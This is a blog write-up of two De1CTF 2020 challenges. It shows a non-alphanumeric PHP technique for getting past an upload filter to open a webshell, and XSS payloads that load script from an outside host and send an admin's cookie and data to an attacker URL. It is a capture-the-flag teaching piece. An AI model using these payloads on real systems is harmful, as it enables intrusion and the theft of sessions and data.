<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    
    
    <title>De1CTF 2020: Hard_Pentest_1 and Animal Crossing, Part 1 · Jamvie: CTF writeups and more</title>

    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    
    <link rel="stylesheet" href="https://jamvie.net/style.main.min.d17e80797ff527ead27a684535a2ae633c413f520c03a563651145b43345ecf3.css" />

</head>
<body class=" post-template ">

    <div class="site-wrapper">

<header class="site-header"><div class="outer site-nav-main">
    <div class="inner"><nav class="site-nav">
    <div class="site-nav-left">
        
            <a class="site-nav-logo" href="https://jamvie.net/">Jamvie: CTF writeups and more</a>
        
        
        <div class="site-nav-content">
            <ul class="nav" role="menu">
                
                <li class="nav-home" role="menuitem"><a href="/about/">About Me</a></li>
                
                <li class="nav-home" role="menuitem"><a href="/tags/misc">Misc</a></li>
                
                <li class="nav-home" role="menuitem"><a href="https://ubcctf.github.io/">My Team</a></li>
                
                <li class="nav-home" role="menuitem"><a href="/tags/writeup">Writeups</a></li>
                
            </ul>
        </div>
        
    </div>
</nav>

</div>
</div></header>

<main id="site-main" class="site-main outer">
    <div class="inner">

        <article class="post-full post  no-image ">

            <header class="post-full-header">

                
                    
                    <section class="post-full-tags">
                        <a href="/tags/writeup">writeup</a>
                    </section>
                

                <h1 class="post-full-title">De1CTF 2020: Hard_Pentest_1 and Animal Crossing, Part 1</h1>

                

                <div class="post-full-byline">
                    <section class="post-full-byline-content">

                        <ul class="author-list">
    <li class="author-list-item">
        <div class="author-card">
            <div class="author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></div>
            <div class="author-info">
                <div class="author-info">
                    <h2>Jamvie</h2>
                </div>
            </div>
        </div>
        <a href="#" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></a>
    </li>
</ul>

                        <section class="post-full-byline-meta">
                            
                                <h4 class="author-name">Jamvie</h4>
                            
                            <div class="byline-meta-content">
                                <time class="byline-meta-date" datetime="2020-35-05">7 May 2020</time>
                                <span class="byline-reading-time"><span class="bull">&bull;</span> 8 min read</span>
                            </div>
                        </section>

                    </section>


                </div>
            </header>

            
            <figure class="post-full-image">
                <img src="https://images.unsplash.com/photo-1585857188938-2f7ae5afb6f8?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="De1CTF 2020: Hard_Pentest_1 and Animal Crossing, Part 1" />
            </figure>
            

            <section class="post-full-content">
                <div class="post-content">
                    <p>The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action.</p>

<p>De1CTF 2020 really gave me a thorough and in-depth understanding of php, maybe more than I would have ever done on my own. It was actually welcome experience to try out web problems that weren&rsquo;t just purely web-based.
Unfortunately, because of that these problems required more time for me to solve. Hard_Pentest_1 has been a journey in its web-based issues, but a whole different adventure in pwning when you actually complete part of it. So this blog post is gonna be a part 1 of 2.</p>

<h2 id="let-s-begin">Let&rsquo;s Begin!</h2>

<h3>Hard_Pentest_1</h3>

<p>The no-css basic HTML page exposes its php scripts right off the bat.</p>

<pre><code class="language-php">&lt;?php
//Clear the uploads directory every hour
highlight_file(__FILE__);
$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);

if($_POST[&quot;submit&quot;]){
    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){
        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
            die($_FILES[&quot;file&quot;][&quot;error&quot;]);
        }
        else{
            $filename=md5($_SERVER['REMOTE_ADDR']).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);
            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;
        }
    }
    else{
        echo &quot;Not Allow!&quot;;
    }
}

function Check(){
    $BlackExts = array(&quot;php&quot;);
    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);

    if(!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content)  &amp;&amp; 
        !in_array($exts, $BlackExts) &amp;&amp; 
        !preg_match('/\.\./',$_FILES[&quot;file&quot;][&quot;name&quot;])) {
          return true;
    }
    return false;
}
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>The <code>Check()</code> method is important here.</p>

<pre><code>function Check(){
    $BlackExts = array(&quot;php&quot;);
    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);

    if(!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content)  &amp;&amp; 
        !in_array($exts, $BlackExts) &amp;&amp; 
        !preg_match('/\.\./',$_FILES[&quot;file&quot;][&quot;name&quot;])) {
          return true;
    }
    return false;
</code></pre>

<p>We can only upload php files, so maybe I can try to open a webshell here. The name, &ldquo;Hard_Pentest&rdquo; also gives me a hint that I should try to open a webshell. But the if statement blocks all alphanumerics and certain special characters from being processed. So, at first glance, anything we feed into this function won&rsquo;t be processed. But php is a <del>strange and weird</del> fascinating language with plenty of loopholes and different quirks about it, one of them, being the concept of &ldquo;<a href="https://www.php.net/manual/en/language.operators.increment.php">string/character arithmetic</a>&rdquo; (not the real term but I have no other informed way to describe it):</p>

<pre><code class="language-php">$a = 'Z'
echo $a++; //Basically, Z + 1. This will print 'AA'

output: 'AA'
</code></pre>

<p>This is valid PHP. This definitely isn&rsquo;t something you&rsquo;d see in other conventional languages. What does it mean to increment &lsquo;Z&rsquo; by 1? Logically it makes no sense, but in PHP it does!</p>

<p>Another thing PHP has that we can utilize here is shorthand statements. Plenty of other languages have this feature as well in some way or another. For example, the ternary operator <code>?</code>:</p>

<pre><code>$result = $condition ? 'Jam' : 'Vie';
</code></pre>

<p>is shorthand for</p>

<pre><code>if ($condition){
    $result = 'Jam';
}else{
    $result = 'Vie';
}
</code></pre>

<p>And finally, the last quirk about php: arrays and strings.</p>

<p>In other <del>normal</del> languages, arrays and strings are treated as distinct, two different data types. Some languages may treat strings as an array of chars, but by convention, just any random and arbitrary array can&rsquo;t and shouldn&rsquo;t be joined with a string without proper typesetting and checking. Okay, sounds fair and good and all. But what does php do instead?</p>

<p>In php, you can join arrays and strings together. The array will be converted to the string: <code>'Array'</code>.</p>

<pre><code>php &gt; echo ''.[];
PHP Notice: Array to string conversion on line 1
Array               &lt;------The string, 'Array'


php &gt; $var = ''.[];
php &gt; echo $var['!'=='@'];   &lt;------Should give us the first leter in 'Array'
A
</code></pre>

<p>Javascript happens to have similar function to this!</p>

<p>What does this mean for us?</p>

<p>Because of the <code>Check()</code> function, we can&rsquo;t use alphanumerics or certain special characters. But for the list of valid special characters, <code>[]</code> square brackets are allowed, so we can declare arrays as normal. And we can still declare variables as usual, and the <code>+</code> operators are still valid so we can utilize string arithmetic.</p>

<p>So, all in all, if we wanted to spell the word <code>GET</code> with all the restrictions above, it would look like</p>

<pre><code>&lt;?= $_=[] ?&gt;
&lt;?= $_=@&quot;$_&quot; ?&gt;
&lt;?= $_=$_['!'=='@'] ?&gt;
&lt;?= $___=$_ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;   
&lt;?= $_______ = $__ ?&gt;  \\G     

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ ?&gt;    \\E
&lt;?= $_______ .= $__ ?&gt;

&lt;?= $__ = $_ ?&gt;
&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ ?&gt;   \\T
&lt;?= $_______ .= $__  ?&gt; \\GET
</code></pre>

<p>Armed with this knowledge, we can write out entire lines of code of php that are just a series of various shorthand operators and symbols, and string arithmetic.</p>

<p>The first hurdle is the existence of the php opening tag. All php code requires the <code>&lt;?php</code> opening tag before anything, kinda like the start of any HTML document needing <code>&lt;HTML&gt;</code> to be declared first at the top.</p>

<p>Checking out php open tags, we come across the existence of shorthand tags for them, in the <a href="https://www.php.net/manual/en/language.basic-syntax.phptags.php">PHP documentation</a>:</p>

<blockquote>
<p>PHP includes a short echo tag &lt;?= which is a short-hand to the more verbose &lt;?php echo.</p>

<p>PHP also allows for short open tag &lt;? (which is discouraged since it is only available if enabled using the short_open_tag php.ini configuration file directive, or if PHP was configured with the &ndash;enable-short-tags option).</p>
</blockquote>

<p>So we can work around saying <code>&lt;?php&gt;</code> with <code>&lt;?=</code> instead!</p>

<p>The second hurdle is the semi-colon, which ends PHP statements. This can be worked around by simply creating new lines of PHP code for each time we want to make a new statement.</p>

<p>So with this in mind we can easily craft a php script to open up a webshell on their server, and poke around.
But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a shell on the server, but the scope of my pwn abilities isn&rsquo;t much to really comprehend what&rsquo;s going on here.</p>

<p>To be continued&hellip;</p>

<hr />

<p><h3>Animal Crossing</h3>
Despite the few solves this problem has, I was drawn to it because of its name. Who doesn&rsquo;t love Animal Crossing?</p>

<p>The website allows you to make a passport. There are fields for your name, island name, and favourite fruit, I think.</p>

<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/DE1CTF01.png" alt="report" /></p>

<p>When we make a passport we are redirected to a URL where the contents of what we typed are reflected in it (a sign of XSS attacks). And, at the bottom, is a report function (A BIG sign of XSS attacks).</p>

<p>When we go ahead and report it&hellip;</p>

<p><img src="https://raw.githubusercontent.com/jamiepoli/JamvieCTF/master/content/images/DE1CTF02.png" alt="report" /></p>

<p>I thought my client broke for a second. I wasn&rsquo;t expecting just plain code to be printed on the front-end.</p>

<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was confused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>

<p>The good thing (in this context, bad for others) about md5 is that it&rsquo;s a one-way hashing but there is no salting to the code value, it&rsquo;s just the hash. Therefore, a string put through md5 would always return the same md5 encoding. So I just needed to randomly generate a string, md5 it, then check the digest against the random one.</p>

<p>Well great, I have succesfully done so and reported my passport to an admin. With this extra step of generating a valid code, the rest of Animal Crossing is a general XSS attack.</p>

<p>We want to report a URL that will grab the admin cookie when a user checks out our URL, and sends it to the server. Part of my payload looks like this:</p>

<pre><code>data=base64DATAXXXXXXX'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://ServerHere.xss.ht\';document.body.appendChild(a)')
</code></pre>

<p>And we retrieve the cookie, which has the flag:</p>

<p><code>FLAG=De1CTF{I_l1k4_</code></p>

<p>But this is just one half of the flag. Where&rsquo;s the other half?</p>

<p>Eventually, De1CTF released a hint: &ldquo;what is the admin doing?&rdquo;</p>

<p>Looking at the document shows hundreds of png images, of what looks like other people&rsquo;s passports. I guess, the other half of the flag is among them. But the hint got me thinking - obviously, the admin would have to be leafing through the screenshots but its not like the flag will just magically turn up in one of the images cause they forgot to hide their flag text file out of view. So unless I can control the screenshot, I doubt I&rsquo;ll be able to find the flag.</p>

<p>The library &lsquo;<a href="https://html2canvas.hertzen.com/">html2canvas</a>&rsquo; comes to mind - taking screenshots with javascript. If I pass a payload to the admin that takes a screenshot of their interface, will the flag be there?</p>

<p>With this in mind, I crafted a payload that would take a screenshot of the admin&rsquo;s screen, then send that to me, basically (similar to my catweb writeup albeit with a slightly different function):</p>

<pre><code>fetch(`/static/images/xxxxxxxxx.png`).then(resp=&gt;resp.text()).then(flag=&gt;fetch(url+(btoa(flag) || 'Nothing')));
</code></pre>

<p>I create this and report it to the admin. When the admin visits the URL with the javascript payload, it will take a screenshot of the admin&rsquo;s interface and sends it back to my server. I get the address and download it for the other half of the flag:</p>

<p><code>cool_GamE}</code></p>

<p>So the full flag would be: <code>FLAG=De1CTF{I_l1k4_cool_GamE}</code></p>

<hr />

<p>Wow! That was a trip. If anything, these challenges taught me that I should probably spend a bit more time broadening my skills if I want to complete problems that intersect with other topics :P</p>

<p>Jam</p>

<h2 id="references">References</h2>

<p>Feature Image by Sara Kurfeß on Unsplash</p>
                </div>
            </section>

        </article>

    </div>
</main>
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
    
    <article class="read-next-card">
        <header class="read-next-card-header">
            <h3><span>More in</span> <a href="/tags/writeup">writeup</a></h3>
        </header>
        <div class="read-next-card-content">
            <ul>
                
            </ul>
        </div>
    </article>
<article class="post-card post
 no-image
 ">

        
    
        <div class="post-card-content">
    
            <a class="post-card-content-link" href="https://jamvie.net/posts/04plaidctf2020_01/">
    
                <header class="post-card-header">
                    
                        
                        <div class="post-card-primary-tag">writeup</div>
                    

                    <h2 class="post-card-title">PlaidCTF 2020: Contrived Web Problem</h2>
                </header>
    
                <section class="post-card-excerpt">
                    <p><p>This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!</p></p>
                </section>
    
            </a>

            <footer class="post-card-meta">
                    <ul class="author-list">
                        <li class="author-list-item">
                            <div class="author-name-tooltip">Jamvie</div>
                            <a href="https://jamiepoli.github.io" class="static-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="https://jamiepoli.github.io/img/profile.png"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg></a>
                        </li>
                    </ul>
                    <div class="post-card-byline-content">
                        <span>Jamvie</span>
                        <span class="post-card-byline-date"><time datetime="2020-124-04">28 April 2020</time>
                            <span class="bull">&bull;</span> 6 min read</span>
                    </div>
                </footer>
    
        </div>

</article>
    

            
        </div>
    </div>
</aside>


        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://jamvie.net/">Jamvie: CTF writeups and more</a> &copy; 2020</section>
                <nav class="site-footer-nav">
                    <a href="https://jamvie.net/">Latest Posts</a>
                    
                    
                    <a href="https://github.com/jamiepoli" target="_blank" rel="noopener">Github</a>
                    <a href="https://jonathanjanssens.com" target="_blank" rel="noopener" style="opacity: 0.5;">Hugo Casper3 by Jonathan Janssens</a>
                </nav>
            </div>
        </footer>

    </div>

</body>
</html>